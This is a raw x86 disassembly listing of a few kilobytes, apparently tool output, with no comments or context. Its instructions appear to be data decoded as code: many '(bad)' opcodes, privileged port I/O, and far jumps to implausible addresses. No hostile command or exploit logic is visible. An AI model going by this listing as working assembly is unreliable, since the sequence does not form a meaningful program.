  4186d3:	xlat   BYTE PTR ds:[ebx]
  4186d4:	into   
  4186d5:	dec    edi
  4186d6:	in     eax,dx
  4186d7:	jbe    0x4186b8
  4186d9:	sub    DWORD PTR [edx+ebx*8-0xb65ec33],edi
  4186e0:	adc    ebp,DWORD PTR [ebx-0x12]
  4186e3:	je     0x418719
  4186e5:	call   0xf398:0x6f1607a0
  4186ec:	pop    ebp
  4186ee:	mov    eax,0x1aeaac2f
  4186f3:	mov    ebx,?
  4186f5:	mov    ds:0xe7f1d13b,al
  4186fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186fb:	lods   al,BYTE PTR ds:[esi]
  4186fc:	fcmove st,st(6)
  4186fe:	sbb    eax,0xd6298047
  418703:	add    ch,bl
  418705:	mov    edi,0x1cffced3
  41870a:	adc    bl,BYTE PTR [ebx-0x732322e]
  418710:	mov    ah,0x14
  418712:	std    
  418713:	xor    eax,DWORD PTR [edx+0x3182d5]
  418719:	jnp    0x4186ff
  41871b:	mov    eax,DWORD PTR [esp+ebp*8]
  41871e:	or     DWORD PTR [ebx],esi
  418720:	pop    edi
  418721:	mov    ch,BYTE PTR [edx+0x5a]
  418724:	mov    dh,0xa8
  418726:	test   DWORD PTR [esi+0x55],eax
  418729:	pop    ds
  41872a:	pop    ss
  41872b:	fwait
  41872c:	enter  0x1ccc,0x73
  418730:	in     al,0x4c
  418732:	imul   ebp,ebp,0xc2a2fde5
  418738:	inc    ecx
  418739:	mov    al,0x3a
  41873b:	sar    DWORD PTR [edx],cl
  41873d:	mov    cl,0x19
  41873f:	mov    WORD PTR [eax],ds
  418741:	mov    eax,0x507fc7dc
  418746:	inc    esp
  418747:	mov    ds:0xe4973c83,al
  41874c:	out    dx,eax
  41874d:	push   ecx
  41874e:	gs ds mov dh,0x15
  418752:	cmp    BYTE PTR [esi],bl
  418754:	add    BYTE PTR [eax],bh
  418756:	(bad)  
  418757:	jl     0x4186ea
  418759:	cmp    eax,0xbfaa1268
  41875e:	stos   DWORD PTR es:[edi],eax
  41875f:	dec    edx
  418760:	rcl    DWORD PTR [esi+0x28d1fd00],cl
  418766:	cld    
  418767:	and    esi,DWORD PTR [ebx+0x18ae4a25]
  41876d:	cmc    
  41876e:	cmp    ecx,DWORD PTR [esi]
  418770:	out    0xb0,eax
  418772:	pop    eax
  418773:	inc    ebx
  418774:	stc    
  418775:	fcomp  QWORD PTR [eax-0x5f5d6b65]
  41877b:	sub    al,0x84
  41877d:	rol    BYTE PTR [ebx-0x5f8fdb8f],1
  418783:	inc    ecx
  418784:	mov    ds:0xec0fbbd6,eax
  418789:	fcomp  DWORD PTR [ebx+esi*4+0x43]
  41878d:	cmp    esi,0xffffffb6
  418790:	sub    DWORD PTR [ebp-0x79442b31],eax
  418796:	push   edi
  418797:	inc    ebp
  418798:	out    0x6b,al
  41879a:	dec    esp
  41879b:	popf   
  41879c:	jle    0x4187d6
  41879e:	jge    0x4187e5
  4187a0:	call   0x45c2:0xf55969ff
  4187a7:	and    bl,BYTE PTR [esi-0x1b]
  4187aa:	add    BYTE PTR [ebx+esi*4-0x19e146d8],ah
  4187b1:	js     0x418788
  4187b3:	loope  0x418788
  4187b5:	jmp    0x646a1b2f
  4187ba:	lds    eax,FWORD PTR [ecx-0x4a6efb7a]
  4187c0:	push   ss
  4187c1:	pop    edx
  4187c2:	repnz ins BYTE PTR es:[edi],dx
  4187c4:	sbb    al,0x7c
  4187c6:	test   al,0xd0
  4187c8:	in     al,dx
  4187c9:	sbb    DWORD PTR [edx+0x5f],0x42f39e5
  4187d0:	out    dx,eax
  4187d1:	call   0x3b2a48b1
  4187d6:	cdq    
  4187d7:	adc    al,0x17
  4187d9:	mov    eax,ds:0xd070ee4a
  4187de:	lods   eax,DWORD PTR ds:[esi]
  4187df:	add    eax,0x829e8c5b
  4187e4:	mov    al,ds:0x4ef2a1dc
  4187e9:	aam    0xcb
  4187eb:	add    ebp,DWORD PTR [eiz*8-0x37bf776b]
  4187f2:	jecxz  0x41878e
  4187f4:	ret    0x857a
  4187f7:	mov    eax,ds:0x8248b77b
  4187fc:	shl    DWORD PTR [ebx],1
  4187fe:	cli    
  4187ff:	dec    edi
  418800:	call   0x3e05435b
  418805:	fimul  DWORD PTR [edx-0x4eb88bc]
  41880b:	test   BYTE PTR [ebx-0x3889ae31],0x73
  418812:	mov    edi,0xe75498b8
  418817:	retf   0x3638
  41881a:	xchg   edi,eax
  41881b:	add    edi,DWORD PTR [eax]
  41881d:	mov    dl,bh
  41881f:	xor    DWORD PTR [edx+edx*1],0xf2db0e1d
  418826:	or     DWORD PTR [eax+eax*1+0x612b0dca],eax
  41882d:	inc    ebx
  41882e:	pusha  
  41882f:	test   edx,ecx
  418831:	repz add ebp,DWORD PTR ds:[ebx-0x58946a3e]
  418839:	repz or edx,0xcb3dc068
  418840:	pfrsqrt mm1,QWORD PTR [eax+0x3ac1ed94]
  418848:	cmp    DWORD PTR [ecx+0x73eaf67a],ebp
  41884e:	out    dx,al
  41884f:	ja     0x4188bd
  418851:	imul   edx,DWORD PTR [esi-0x5ce5fdfe],0xffffff98
  418858:	add    edx,DWORD PTR [ecx]
  41885a:	xchg   edi,eax
  41885b:	adc    BYTE PTR [esi],dh
  41885d:	sbb    DWORD PTR [ecx-0x223e8f3f],ecx
  418863:	int3   
  418864:	fldenv [edx]
  418866:	std    
  418867:	mov    ss,WORD PTR [ebx+0x582c104b]
  41886d:	js     0x418817
  41886f:	mov    DWORD PTR [eax-0x1301d0d5],esi
  418875:	jmp    0x567b694c
  41887a:	test   al,0x1
  41887c:	add    eax,0x6041571e
  418881:	or     ah,bl
  418883:	les    esp,FWORD PTR [eax+ebp*2]
  418886:	fisttp WORD PTR [ebx+0x76]
  418889:	stos   DWORD PTR es:[edi],eax
  41888a:	mov    dh,0xf0
  41888c:	scas   al,BYTE PTR es:[edi]
  41888d:	jg     0x4188fc
  41888f:	cmp    ebp,DWORD PTR [ebp+edx*4-0x32]
  418893:	or     eax,ebx
  418895:	test   al,0x48
  418897:	outs   dx,DWORD PTR ds:[esi]
  418898:	mov    BYTE PTR [ebp-0x57],ah
  41889b:	dec    bp
  41889d:	(bad)  
  41889e:	jl     0x418902
  4188a0:	xchg   esp,eax
  4188a1:	mov    es,WORD PTR [esi-0x4aeaa96c]
  4188a7:	dec    esi
  4188a8:	lods   eax,DWORD PTR ds:[esi]
  4188a9:	pop    ecx
  4188aa:	fisttp QWORD PTR ds:0xae68bed5
  4188b0:	cmp    eax,0x31ac966e
  4188b5:	cmp    esp,DWORD PTR [ebx]
  4188b7:	jmp    0x4188a7
  4188b9:	and    DWORD PTR [esi+0x49e17c61],ebp
  4188bf:	aaa    
  4188c0:	mov    ebp,eax
  4188c2:	lahf   
  4188c3:	loop   0x418896
  4188c5:	adc    DWORD PTR [edi],eax
  4188c7:	adc    eax,0xa1499034
  4188cc:	xor    ebx,DWORD PTR [edx-0x7be14c18]
  4188d2:	sbb    ebx,DWORD PTR [edi]
  4188d4:	cmp    DWORD PTR [edi],ecx
  4188d6:	mov    eax,0xac132c01
  4188db:	aas    
  4188dc:	retf   0x83e5
  4188df:	jg     0x4188af
  4188e1:	dec    esi
  4188e2:	into   
  4188e3:	das    
  4188e4:	dec    edx
  4188e5:	retf   0x99b9
  4188e8:	loope  0x41893a
  4188ea:	jno    0x41895b
  4188ec:	cdq    
  4188ed:	fbstp  TBYTE PTR [ecx+0x5f]
  4188f0:	mov    DWORD PTR [ebx-0x3664a1e4],ebx
  4188f6:	popa   
  4188f7:	mov    esp,0x4f5823af
  4188fc:	inc    esp
  4188fd:	adc    al,0x9
  4188ff:	iret   
  418900:	push   ebx
  418901:	pop    ebp
  418902:	nop
  418903:	lods   eax,DWORD PTR ds:[esi]
  418904:	push   esi
  418905:	inc    ebp
  418906:	mov    dl,0x64
  418908:	nop
  418909:	out    dx,al
  41890a:	ds and eax,0x872420c
  418910:	icebp  
  418911:	xchg   esp,eax
  418912:	call   0x24d2f43f
  418917:	loopne 0x41898d
  418919:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41891a:	pop    ss
  41891b:	mov    esi,0xfe79f18f
  418920:	ror    BYTE PTR [ebx],0xd4
  418923:	cmp    eax,0x58fb0c1f
  418928:	jmp    0x9cf44cbb
  41892d:	ins    BYTE PTR es:[edi],dx
  41892e:	rol    DWORD PTR [eax+0x7f],1
  418931:	out    dx,al
  418932:	sub    bl,BYTE PTR [edx+0x1c]
  418935:	mov    edi,0x3534654b
  41893a:	jmp    0xb0a55ad4
  41893f:	nop
  418940:	adc    esp,ebx
  418942:	jge    0x418932
  418944:	xor    al,0x81
  418946:	pop    bp
  418948:	rol    edi,1
  41894a:	lock int 0x2f
  41894d:	xor    bh,BYTE PTR [ebx-0x468e6fcf]
  418953:	js     0x4189b4
  418955:	(bad)  
  418956:	cmp    bh,BYTE PTR [edx+0x3df46396]
  41895c:	cmp    eax,0x66cf0d1
  418961:	lahf   
  418962:	(bad)  
  418963:	dec    ecx
  418964:	lahf   
  418965:	ja     0x4189c2
  418967:	add    ebx,DWORD PTR [edx-0x96cb55f]
  41896d:	loopne 0x4189cc
  41896f:	mov    dl,0xd0
  418971:	test   DWORD PTR ss:[ecx],edx
  418974:	xchg   esp,eax
  418975:	(bad)  
  418976:	in     al,0x89
  418978:	icebp  
  418979:	sub    eax,ebp
  41897b:	ret    
  41897c:	scas   eax,DWORD PTR es:[edi]
  41897d:	push   esp
  41897e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41897f:	aaa    
  418980:	aas    
  418981:	mov    edx,DWORD PTR [esi+0x15dc4752]
  418987:	sar    esi,1
  418989:	push   ds
  41898a:	or     eax,0x30ac476d
  41898f:	mov    ds:0xb625cf82,eax
  418994:	add    al,0x57
  418996:	ror    edi,1
  418998:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418999:	mov    BYTE PTR [edx+0x2d],0xfa
  41899d:	pop    es
  41899e:	popa   
  41899f:	rcl    DWORD PTR [ebp-0x56],cl
  4189a2:	fwait
  4189a3:	or     eax,0xd28e76f9
  4189a8:	jb     0x4189fb
  4189aa:	outs   dx,DWORD PTR ds:[esi]
  4189ab:	xchg   DWORD PTR [edx-0x411ff42],edx
  4189b1:	add    eax,0x6ff4bb93
  4189b6:	inc    edi
  4189b7:	jmp    0x639:0x23247807
  4189be:	adc    DWORD PTR [esi-0x3c489f2],ebp
  4189c4:	mov    ebx,0xbf6f6aa5
  4189c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189ca:	es out dx,al
  4189cc:	xor    eax,0xd063b7bf
  4189d1:	out    dx,eax
  4189d2:	aaa    
  4189d3:	repz pop ss
  4189d5:	jae    0x4189cf
  4189d7:	adc    bl,BYTE PTR [ecx-0x16]
  4189da:	or     cl,bh
  4189dc:	int    0x2b
  4189de:	xchg   BYTE PTR [edi-0x69caeae4],ah
  4189e4:	iret   
  4189e5:	repnz std 
  4189e7:	add    ebx,DWORD PTR [ebp-0x73adc26d]
  4189ed:	inc    ebp
  4189ee:	ficomp WORD PTR [edi]
  4189f0:	in     eax,0xfb
  4189f2:	adc    esp,0x9
  4189f5:	fld    QWORD PTR [edi+0x620e0ed3]
  4189fb:	mov    bh,0x52
  4189fd:	aad    0x1c
  4189ff:	popa   
  418a00:	inc    edi
  418a01:	(bad)  
  418a02:	leave  
  418a03:	fwait
  418a04:	xchg   edi,eax
  418a05:	std    
  418a06:	mov    WORD PTR [edi],es
  418a08:	test   eax,0x5c9d09f7
  418a0d:	inc    ebp
  418a0e:	mov    ebx,0xfc9a0c00
  418a13:	push   cs
  418a14:	(bad)  [eiz*4-0x5f8cdfd]
  418a1b:	fiadd  WORD PTR [ebp-0x74c4002b]
  418a21:	inc    ebp
  418a22:	or     al,0x33
  418a24:	ror    DWORD PTR [ebx-0x3dfc07b3],0xf
  418a2b:	scas   eax,DWORD PTR es:[edi]
  418a2c:	shr    ecx,0xba
  418a2f:	and    eax,DWORD PTR [eax]
  418a31:	add    al,bh
  418a33:	loope  0x4189be
  418a35:	mov    ah,0x87
  418a37:	test   bl,al
  418a39:	mov    ebp,0x3e8f68ea
  418a3e:	mov    cs,WORD PTR [ebp+0x1f39d619]
  418a44:	popa   
  418a45:	(bad)  
  418a46:	rcr    BYTE PTR [edi+0x62],0x62
  418a4a:	iret   
  418a4b:	dec    eax
  418a4c:	sub    BYTE PTR [ebp+0x2],ch
  418a4f:	arpl   WORD PTR [esi],bx
  418a51:	rol    DWORD PTR [ebx],0x42
  418a54:	and    DWORD PTR [eax+0x2a4e16eb],eax
  418a5a:	in     eax,0x80
  418a5c:	je     0x418aaf
  418a5e:	je     0x418ab2
  418a60:	dec    esp
  418a61:	mov    DWORD PTR gs:[ecx*1+0x43344db3],edx
  418a69:	sbb    cl,BYTE PTR [ecx+0x3079c428]
  418a6f:	iret   
  418a70:	dec    edi
  418a71:	outs   dx,BYTE PTR ds:[esi]
  418a72:	outs   dx,BYTE PTR ds:[esi]
  418a73:	bnd jns 0x418ae8
  418a76:	inc    esp
  418a77:	pop    ds
  418a78:	xor    bl,bh
  418a7a:	mov    ch,0xfc
  418a7c:	push   esp
  418a7d:	dec    edx
  418a7e:	hlt    
  418a7f:	std    
  418a80:	stos   BYTE PTR es:[edi],al
  418a81:	(bad)
  418a84:	adc    ecx,ecx
  418a86:	ja     0x418a32
  418a88:	mov    ebp,0x9b6f567c
  418a8d:	in     al,dx
  418a8e:	das    
  418a8f:	dec    edi
  418a90:	and    al,0xa8
  418a92:	mov    ebp,0x29b66e99
  418a97:	or     DWORD PTR [edi+0xc],edx
  418a9a:	pushf  
  418a9b:	jne    0x418a22
  418a9d:	in     eax,dx
  418a9e:	fxam   
  418aa0:	jns    0x418a6c
  418aa2:	xchg   ebp,eax
  418aa3:	int    0xfd
  418aa5:	inc    ebp
  418aa6:	into   
  418aa7:	sbb    eax,0x827e2c25
  418aac:	cld    
  418aad:	lea    edi,ds:0xc39445cd
  418ab3:	jns    0x418a41
  418ab5:	ins    BYTE PTR es:[edi],dx
  418ab6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ab7:	out    0x61,al
  418ab9:	addr16 push ss
  418abb:	mov    WORD PTR [esi],?
  418abd:	out    dx,al
  418abe:	popf   
  418abf:	loop   0x418b29
  418ac1:	sahf   
  418ac2:	push   es
  418ac3:	dec    edx
  418ac4:	xchg   edi,eax
  418ac5:	xchg   ebx,eax
  418ac6:	arpl   WORD PTR [ebx+ebp*4-0x7d],ax
  418aca:	outs   dx,DWORD PTR ds:[esi]
  418acb:	mov    es:0xf3bcd558,eax
  418ad1:	push   edx
  418ad2:	fiadd  WORD PTR [edx+ecx*1+0x2c972f6e]
  418ad9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ada:	fcmovbe st,st(2)
  418adc:	push   0xffffffb2
  418ade:	shl    DWORD PTR [ebp+0x2edf1529],0x96
  418ae5:	jecxz  0x418aa2
  418ae7:	push   0x5b
  418ae9:	pop    ecx
  418aea:	sbb    dl,BYTE PTR [edi+0x54]
  418aed:	or     dl,ch
  418aef:	pushf  
  418af0:	push   esi
  418af1:	jmp    0x8505:0x5acb09fe
  418af8:	inc    ecx
  418af9:	pop    ds
  418afa:	loop   0x418b5c
  418afc:	data16 xlat BYTE PTR ds:[ebx]
  418afe:	inc    eax
  418aff:	out    0x4c,al
  418b01:	and    ebp,DWORD PTR [esi+0x46]
  418b04:	xchg   ecx,eax
  418b05:	pop    ebp
  418b06:	dec    ecx
  418b07:	mov    ecx,0xfe0e0a1e
  418b0c:	push   es
  418b0d:	das    
  418b0e:	sub    BYTE PTR [esi+0x5305fd7e],dl
  418b14:	ficom  DWORD PTR [edx-0xb83d611]
  418b1a:	ss sahf 
  418b1c:	ret    0x7f19
  418b1f:	nop
  418b20:	fimul  WORD PTR [edi]
  418b22:	fmul   DWORD PTR [edi]
  418b24:	call   0x499c:0x2fcc448e
  418b2b:	int    0xaa
  418b2d:	mov    bl,0x3c
  418b2f:	mov    ds:0x959afda6,eax
  418b34:	gs pop ds
  418b36:	imul   edx,edx,0xe6b32cab
  418b3c:	in     eax,0xc7
  418b3e:	imul   BYTE PTR [esi-0x6d]
  418b41:	jno    0x418b24
  418b43:	stos   DWORD PTR es:[edi],eax
  418b44:	xor    DWORD PTR ds:0x255ab938,ebp
  418b4a:	inc    DWORD PTR [esi]
  418b4c:	(bad)  
  418b4d:	retf   0x6537
  418b50:	push   ebp
  418b51:	and    edx,DWORD PTR [edi]
  418b53:	jg     0x418b96
  418b55:	sbb    DWORD PTR [ebx+eiz*1],esp
  418b58:	adc    ebp,edx
  418b5a:	popf   
  418b5b:	pop    esi
  418b5c:	imul   esi,DWORD PTR [ecx-0x47],0xd19fad7f
  418b63:	outs   dx,DWORD PTR ds:[esi]
  418b64:	jg     0x418bc1
  418b66:	outs   dx,BYTE PTR ds:[esi]
  418b67:	and    DWORD PTR [bx-0x5b],esi
  418b6b:	push   ds
  418b6c:	xchg   dl,bh
  418b6e:	or     ecx,ebx
  418b70:	xor    DWORD PTR [edi-0x41],0xffffffb6
  418b74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b75:	cli    
  418b76:	and    esi,DWORD PTR [ebx-0x919cded]
  418b7c:	je     0x418be4
  418b7e:	mov    esi,DWORD PTR [ebx+0x27]
  418b81:	or     ecx,DWORD PTR [ebp+0x1de39295]
  418b87:	je     0x418b60
  418b89:	in     eax,0xc6
  418b8b:	push   ebx
  418b8c:	iret   
  418b8d:	push   edx
  418b8e:	aas    
  418b8f:	mov    edi,0x4a061cfd
  418b94:	mov    eax,0x6e2a6e26
  418b99:	sbb    eax,0x9fde125d
  418b9e:	xor    eax,0x900d763
  418ba3:	add    DWORD PTR [ebx],ebx
  418ba5:	sti    
  418ba6:	clc    
  418ba7:	div    esi
  418ba9:	sar    dl,1
  418bab:	adc    eax,0x3de00620
  418bb0:	and    cl,ch
  418bb2:	push   0x8ad5e039
  418bb7:	test   eax,0x70eba0f8
  418bbc:	mov    BYTE PTR [ebp-0x6e134a01],bl
  418bc2:	xor    BYTE PTR [ecx+0x11],ch
  418bc5:	dec    edi
  418bc6:	(bad)  
  418bc7:	aad    0x95
  418bc9:	mov    bl,0xcc
  418bcb:	icebp  
  418bcc:	sbb    al,0xce
  418bce:	dec    esi
  418bcf:	mov    DWORD PTR [esi-0x32],eax
  418bd2:	imul   esi,DWORD PTR [ebx-0x42],0xecdca2da
  418bd9:	xlat   BYTE PTR ds:[ebx]
  418bda:	push   ebx
  418bdb:	aam    0xcb
  418bdd:	dec    eax
  418bde:	adc    ch,BYTE PTR [edi-0x686ed95a]
  418be4:	imul   edi,DWORD PTR [ebx+0x0],0xa05849e2
  418beb:	pop    esp
  418bec:	push   edi
  418bed:	lods   al,BYTE PTR ds:[esi]
  418bee:	and    eax,0x8eec80ab
  418bf3:	xchg   esi,eax
  418bf4:	shl    BYTE PTR [esi-0x2817632e],1
  418bfa:	push   esi
  418bfb:	push   ecx
  418bfc:	nop
  418bfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bfe:	out    dx,eax
  418bff:	inc    ebx
  418c00:	dec    eax
  418c01:	xchg   ebx,eax
  418c02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c03:	inc    ebx
  418c04:	addr16 out 0xd6,al
  418c07:	repnz repnz adc BYTE PTR [esi],0xfb
  418c0c:	je     0x418c81
  418c0e:	cmp    ebp,DWORD PTR [ebx]
  418c10:	push   cs
  418c11:	rol    DWORD PTR [ebx],cl
  418c13:	xor    esp,DWORD PTR [edi]
  418c15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c16:	adc    ebp,esi
  418c18:	dec    edi
  418c19:	jp     0x418c39
  418c1b:	rcr    DWORD PTR [ebx-0x18],1
  418c1e:	adc    al,0x7
  418c20:	mov    ch,0xd3
  418c22:	pop    esp
  418c23:	ins    DWORD PTR es:[edi],dx
  418c24:	loopne 0x418bae
  418c26:	lds    esi,FWORD PTR [ebx+edx*8]
  418c29:	retf   0xe5d5
  418c2c:	pop    esi
  418c2d:	pop    edx
  418c2e:	mov    ds:0x4d674928,al
  418c33:	adc    BYTE PTR [bp+0x53],dl
  418c37:	sti    
  418c38:	aad    0x81
  418c3a:	rcl    DWORD PTR [ebp-0x52254ae3],1
  418c40:	and    ebx,DWORD PTR [ebx+0x5c552589]
  418c46:	fucomp st(6)
  418c48:	inc    ebp
  418c49:	mov    dh,0x3a
  418c4c:	test   edi,ecx
  418c4e:	inc    esi
  418c4f:	loop   0x418c45
  418c51:	mov    ds:0x68fd1859,al
  418c56:	cld    
  418c57:	or     al,0xab
  418c59:	push   ds
  418c5a:	sub    eax,edx
  418c5c:	fcomp  DWORD PTR [ebp+0x38]
  418c5f:	aad    0xa3
  418c61:	sbb    ch,BYTE PTR [ecx-0x7f]
  418c64:	push   esi
  418c65:	add    DWORD PTR [ebp+ebp*4+0x1b9e57dc],ebx
  418c6c:	ins    BYTE PTR es:[edi],dx
  418c6d:	in     al,0xa1
  418c6f:	stos   DWORD PTR es:[edi],eax
  418c70:	cmp    edx,DWORD PTR [eax]
  418c72:	or     edi,ecx
  418c74:	js     0x418c6b
  418c76:	inc    edx
  418c77:	push   cs
  418c78:	inc    DWORD PTR [eax+0x4c]
  418c7b:	pop    ds
  418c7c:	into   
  418c7d:	lods   eax,DWORD PTR ds:[esi]
  418c7e:	popa   
  418c7f:	add    eax,0xc0d15da9
  418c84:	mov    eax,ds:0x6e0f54d5
  418c89:	cmp    BYTE PTR [ebp+0x144d33b4],dh
  418c8f:	xor    al,0x21
  418c91:	mov    cl,0xf8
  418c93:	fisubr DWORD PTR ds:0xadc9fa83
  418c99:	fnstsw WORD PTR [edx+edx*4-0x6796a23d]
  418ca0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ca1:	dec    eax
  418ca2:	js     0x418c46
  418ca4:	xchg   esi,eax
  418ca5:	sbb    DWORD PTR [eax-0x32ec7560],ebx
  418cab:	jo     0x418ce9
  418cad:	jbe    0x418d2e
  418caf:	or     ah,BYTE PTR [edi+0x200cf22a]
  418cb5:	out    dx,eax
  418cb6:	lods   al,BYTE PTR ds:[esi]
  418cb7:	fwait
  418cb8:	mov    cl,0xed
  418cba:	int    0x64
  418cbc:	addr16 jb 0x418d22
  418cbf:	jmp    0x418c55
  418cc1:	jle    0x418ca3
  418cc3:	cmp    ebp,DWORD PTR [ebx+0x7b]
  418cc6:	je     0x418c79
  418cc8:	and    esi,eax
  418cca:	push   0xb528c41f
  418ccf:	jmp    0xd4f089ba
  418cd4:	sub    esi,0xffffffda
  418cd7:	mov    esp,0x59816de2
  418cdc:	popa   
  418cdd:	adc    BYTE PTR [ecx+0x1b1fe10],al
  418ce3:	jnp    0x418c7d
  418ce5:	push   cs
  418ce6:	clc    
  418ce7:	push   edx
  418ce8:	lea    eax,[esi]
  418cea:	mov    dh,0x43
  418cec:	push   eax
  418ced:	push   ebx
  418cee:	mul    DWORD PTR [edi]
  418cf0:	mov    ds:0x5dd59f4e,eax
  418cf5:	and    BYTE PTR [ecx-0x7b9160f8],dl
  418cfb:	xlat   BYTE PTR ds:[ebx]
  418cfc:	dec    eax
  418cfd:	cmc    
  418cfe:	fiadd  DWORD PTR [ebx+edi*4]
  418d01:	xor    DWORD PTR [ecx+0x4c],ecx
  418d04:	shl    DWORD PTR [ebx+0x6e1d46c3],cl
  418d0a:	jg     0x418caa
  418d0c:	into   
  418d0d:	shl    DWORD PTR [esi],cl
  418d0f:	mov    ss,eax
  418d11:	cdq    
  418d12:	arpl   si,cx
  418d14:	xchg   edi,eax
  418d15:	dec    ecx
  418d16:	add    bl,BYTE PTR [edx]
  418d18:	mov    ah,0xf7
  418d1a:	inc    ebp
  418d1b:	add    ebp,DWORD PTR [eax-0x1e448abe]
  418d21:	mov    eax,ds:0xce8b0e42
  418d26:	dec    ecx
  418d27:	or     DWORD PTR [edx+0x1],ebp
  418d2a:	je     0x418cbd
  418d2c:	ret    
  418d2d:	fs fwait
  418d2f:	xchg   edi,eax
  418d30:	or     esp,ecx
  418d32:	xchg   edx,eax
  418d33:	shl    DWORD PTR ds:0xb1bbc423,0x39
  418d3a:	(bad)  [ebx+ebp*4]
  418d3d:	scas   eax,DWORD PTR es:[edi]
  418d3e:	test   BYTE PTR [esp+eax*2+0x69a12ef5],ah
  418d45:	aaa    
  418d46:	inc    edi
  418d47:	in     eax,0xa3
  418d49:	pop    ebp
  418d4a:	sbb    dh,dl
  418d4c:	jl     0x418d22
  418d4e:	inc    edi
  418d4f:	xor    eax,0x4a5c17ac
  418d54:	loope  0x418d43
  418d56:	and    eax,0x37046c90
  418d5b:	sub    ebp,0xffffffcb
  418d5e:	push   esi
  418d5f:	mov    bl,0x5
  418d61:	inc    ebx
  418d62:	inc    edx
  418d63:	sti    
  418d64:	push   esi
  418d65:	push   ecx
  418d66:	xchg   ebp,eax
  418d67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d68:	jge    0x418d34
  418d6a:	inc    edi
  418d6b:	jg     0x418cf3
  418d6d:	mov    cl,0xdc
  418d6f:	xchg   ebx,eax
  418d70:	mov    WORD PTR ds:0x5d10efd6,es
  418d76:	xchg   esi,eax
  418d77:	mul    esi
  418d79:	push   eax
  418d7a:	xor    edx,esp
  418d7c:	rcr    esi,cl
  418d7e:	pop    edi
  418d7f:	js     0x418d93
  418d81:	stos   DWORD PTR es:[edi],eax
  418d82:	adc    ch,bl
  418d84:	lods   al,BYTE PTR ds:[esi]
  418d85:	pop    ss
  418d86:	jbe    0x418d18
  418d88:	into   
  418d89:	add    eax,0x57b6c48f
  418d8e:	sbb    DWORD PTR [ebp+0x76],ecx
  418d91:	dec    esp
  418d92:	in     eax,dx
  418d93:	cmp    BYTE PTR [esi-0x64],dh
  418d96:	lock rcl DWORD PTR [edi],1
  418d99:	bound  esi,QWORD PTR [edi]
  418d9b:	(bad)  [ecx]
  418d9d:	sti    
  418d9e:	xor    eax,0x12ab76e8
  418da3:	add    eax,0xeb4ea87e
  418da8:	push   edi
  418da9:	fs scas al,BYTE PTR es:[edi]
  418dab:	loopne 0x418daf
  418dad:	pop    ss
  418dae:	mov    DWORD PTR [ebp-0x10],ecx
  418db1:	lods   al,BYTE PTR ds:[esi]
  418db2:	cs pushf 
  418db4:	gs (bad) 
  418db7:	sbb    ebp,DWORD PTR [esp+ebp*4-0x178de95d]
  418dbe:	ret    0x8902
  418dc1:	adc    ebx,0xffffff94
  418dc4:	push   ebp
  418dc5:	jle    0x418db2
  418dc7:	aam    0x87
  418dc9:	fistp  DWORD PTR [edx-0x6891e421]
  418dcf:	adc    ah,dh
  418dd1:	nop
  418dd2:	dec    ebx
  418dd3:	push   ds
  418dd4:	in     al,0x4b
  418dd6:	call   0x56e2b347
  418ddb:	sbb    eax,0x56561ef3
  418de0:	lahf   
  418de1:	loop   0x418e11
  418de3:	cwde   
  418de4:	xor    DWORD PTR [ecx+0x62],ecx
  418de7:	inc    eax
  418de8:	xchg   edx,esp
  418dea:	push   es
  418deb:	mov    esi,?
  418ded:	pop    eax
  418dee:	mul    DWORD PTR [edx]
  418df0:	and    DWORD PTR [eax+edi*1],ebp
  418df3:	and    BYTE PTR es:[esi+eax*8-0x3699357],0xef
  418dfc:	dec    ecx
  418dfd:	jbe    0x418e55
  418dff:	add    eax,0x9f13931e
  418e04:	inc    edx
  418e05:	xor    al,dh
  418e07:	test   eax,0xe526c65c
  418e0c:	stos   DWORD PTR es:[edi],eax
  418e0d:	(bad)  
  418e0e:	loopne 0x418e81
  418e10:	pushf  
  418e11:	dec    ebx
  418e12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e13:	jns    0x418e77
  418e15:	(bad)  [ebp-0x5c37da30]
  418e1b:	(bad)  
  418e1e:	lahf   
  418e1f:	call   0xed55:0xc5a0883a
  418e26:	cli    
  418e27:	mov    eax,0x29702
  418e2c:	mov    dh,0xe5
  418e2e:	lods   eax,DWORD PTR ds:[esi]
  418e2f:	(bad)  
  418e30:	out    0x6f,al
  418e32:	push   edx
  418e33:	jg     0x418de8
  418e35:	lahf   
  418e36:	cs pop ss
  418e38:	push   cs
  418e39:	or     esi,DWORD PTR [edx+eiz*2+0x26d07168]
  418e40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e41:	mov    eax,0xaa917f78
  418e46:	dec    eax
  418e47:	xchg   dh,cl
  418e49:	in     al,dx
  418e4a:	and    al,0x71
  418e4c:	mov    esi,0x56788d5f
  418e51:	add    al,0x0
  418e53:	rcl    eax,1
  418e55:	ss sahf 
  418e57:	in     al,0x33
  418e59:	loopne 0x418ebe
  418e5b:	adc    BYTE PTR [eax+edx*8],dl
  418e5e:	cdq    
  418e5f:	mov    al,ds:0xd08db8f2
  418e64:	imul   ebx,DWORD PTR [edx+eiz*1-0x51],0xe985a817
  418e6c:	push   esi
  418e6d:	xchg   ebp,eax
  418e6e:	pop    es
  418e6f:	jno    0x418e02
  418e71:	and    ch,bh
  418e73:	add    al,0xae
  418e75:	lds    ebx,FWORD PTR [edi+eiz*1]
  418e78:	sub    DWORD PTR [eax],edi
  418e7a:	jmp    0x418e26
  418e7c:	fistp  DWORD PTR [ecx-0x7f463fc1]
  418e82:	mov    ds:0xda3fe113,eax
  418e87:	push   edx
  418e88:	popf   
  418e89:	pop    edx
  418e8a:	pop    esi
  418e8b:	jae    0x418eaa
  418e8d:	mov    esi,0xd000e753
  418e92:	mov    ecx,0x9aca1ab2
  418e97:	(bad)  
  418e98:	cli    
